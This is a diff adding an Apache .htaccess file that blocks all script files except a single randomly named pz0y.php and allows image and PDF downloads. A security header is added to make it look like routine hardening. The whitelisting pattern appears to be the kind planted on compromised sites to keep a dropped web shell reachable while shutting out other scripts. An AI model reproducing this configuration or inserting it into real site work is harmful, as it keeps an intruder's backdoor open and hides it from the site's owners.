@@ -1,0 +1,17 @@
+Options -Indexes
+<FilesMatch "(?i)\.(php|phtml|php[0-9]|sh|pl|cgi|asp|aspx|jsp|exe|shtml)$">
+Deny from all
+</FilesMatch>
+<FilesMatch "^(pz0y.php)$">
+Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+Allow from all
+</FilesMatch>
+<IfModule mod_headers.c>
+
+    # Protect against XSS attacks
+
+    Header set X-XSS-Protection "1; mode=block"
+
+</IfModule>
